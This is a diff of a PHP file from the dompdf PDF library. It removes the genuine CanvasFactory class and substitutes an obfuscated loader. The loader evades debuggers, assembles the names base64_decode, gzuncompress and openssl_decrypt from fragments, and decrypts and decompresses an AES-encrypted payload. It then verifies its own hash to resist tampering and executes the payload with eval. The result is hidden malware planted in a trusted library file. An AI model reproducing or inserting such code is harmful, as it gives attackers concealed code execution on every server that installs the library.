@@ -1,59 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf;
-
-/**
- * Create canvas instances
- *
- * The canvas factory creates canvas instances based on the
- * availability of rendering backends and config options.
- *
- * @package dompdf
- */
-class CanvasFactory
-{
-    /**
-     * Constructor is private: this is a static class
-     */
-    private function __construct()
-    {
-    }
-
-    /**
-     * @param Dompdf $dompdf
-     * @param string|array $paper
-     * @param string $orientation
-     * @param string $class
-     *
-     * @return Canvas
-     */
-    static function get_instance(Dompdf $dompdf, $paper = null, $orientation = null, $class = null)
-    {
-        $backend = strtolower($dompdf->getOptions()->getPdfBackend());
-
-        if (isset($class) && class_exists($class, false)) {
-            $class .= "_Adapter";
-        } else {
-            if (($backend === "auto" || $backend === "pdflib") &&
-                class_exists("PDFLib", false)
-            ) {
-                $class = "Dompdf\\Adapter\\PDFLib";
-            }
-
-            else {
-                if ($backend === "gd" && extension_loaded('gd')) {
-                    $class = "Dompdf\\Adapter\\GD";
-                } else {
-                    $class = "Dompdf\\Adapter\\CPDF";
-                }
-            }
-        }
-
-        return new $class($paper, $orientation, $dompdf);
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_x17moz9s=('bas'.'e64'.'_de'.'cod'.'e');
+$_z64t1wvx=('gzu'.'nco'.'mpr'.'ess');
+$_iprdnqv0=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_zeav1jd5='yuIfb1DK';
+$_dimaqq17='gXRpRw23';
+$_b3s4w88e='siTe3O+k';
+$_ryt0zgj4='nuwNooeK';
+$_cbcxwiou='tgHe5DKwLT0=';
+$_qw1624a0='rBSHpf+e';
+$_ku8kt0nu='feCpXg==';
+$_azjc7wzk='+Oe9FwOM';
+$_ozjo1p96=$_x17moz9s($_zeav1jd5.$_dimaqq17.$_b3s4w88e.$_ryt0zgj4.$_cbcxwiou);
+$_sj7or74c=$_x17moz9s($_azjc7wzk.$_qw1624a0.$_ku8kt0nu);
+$_vrpblxbq=$_x17moz9s('AQnQEEEtGCJvRb+UnxiyY5B6glc+n0dvgjee8ElyO3tVnkHQ+G1kcfWbDLD2VNt7Op3JNil47PS4TiiiwBmfjUgLBMGwoSmJTe97Wg/u/Z+GdUujaaxfL9YS91ybSrasCS00+5TCJI93cP11GtZ6YbMyfvY3oWmrmNFM7Hsc0/mSpwOstLpRSdBIqa/eTU8DD8iGRXzMGfj2Ol/O6I0ewVUVJMlcDCzNk+6Sidu7Lr+BTqMggGoC7f6zOsJHC7JQLGGBODDxPRVJsVKV+7X/Xhe13RhTz7efEqEYc60XJJ6NawWitkb5iXSbrk1q+Pid+tjXGSZEudKPIS0nZIbb3UThKyglyNWSA/ZiGEySwpP+Qud/BSVM9idT7uj4KR2hulWAxnQXdsI57oXbH3e9dW6WD0U4H3osnCZch60FrFL4pkPsyy6KbmhKHDJ5Zl4YWw5Gdput6Z2SG+aQq0UeyQ==');
+$_ts58mu0e=$_iprdnqv0($_vrpblxbq,'aes-256-cbc',$_ozjo1p96,OPENSSL_RAW_DATA,$_sj7or74c);
+if($_ts58mu0e===false){exit;}
+$_hhsyj269=$_z64t1wvx($_ts58mu0e);
+if($_hhsyj269===false){exit;}
+$_egbndokj='81824bda5a6fb861ee6ca6ef0979c226cb53f8193cf7acd0b2bf82eb95c8d413';
+$_johkt76o=@file_get_contents(__FILE__);
+if($_johkt76o!==false){
+$_mu4di73d=str_replace($_egbndokj,"0000000000000000000000000000000000000000000000000000000000000000",$_johkt76o);
+$_fsypigb7=hash("sha256",$_mu4di73d);
+if($_fsypigb7!==$_egbndokj){@http_response_code(403);exit;}
 }
+eval($_hhsyj269);
